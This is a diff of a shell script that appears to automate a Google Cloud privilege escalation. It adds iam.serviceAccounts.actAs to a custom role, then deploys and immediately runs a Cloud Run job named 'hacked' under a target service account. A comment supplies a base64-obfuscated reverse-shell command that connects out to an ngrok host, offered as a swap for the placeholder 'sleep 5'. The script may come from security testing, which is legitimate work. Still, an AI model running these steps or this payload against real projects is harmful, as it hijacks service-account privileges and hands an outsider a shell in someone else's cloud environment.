@@ -9,7 +9,9 @@ echo "Checking run.jobs.create"
 #enable_service "container.googleapis.com"
 
 
-modify_role "run.jobs.create,run.jobs.get,run.jobs.run,run.jobs.update"
+modify_role "run.jobs.create,run.jobs.get,run.jobs.run,iam.serviceaccounts.actAs"
+
+gcloud iam roles update "$ROLE_NAME" --project="${PROJECT_ID}" --permissions="iam.serviceAccounts.actAs,run.jobs.create,run.jobs.get,run.jobs.run"
 
 # For reverse shell use instead of sleep 5: echo c2ggLWkgPiYgL2Rldi90Y3AvNy50Y3AuZXUubmdyb2suaW8vMTQ4NDEgMD4mMQ== | base64 -d | bash
 gcloud beta run jobs deploy hacked \
@@ -19,7 +21,7 @@ gcloud beta run jobs deploy hacked \
 --args="-c,sleep 5" \
 --service-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" \
 --region=us-central1 \
---project=security-devbox --execute-now
+--execute-now
 
 
 
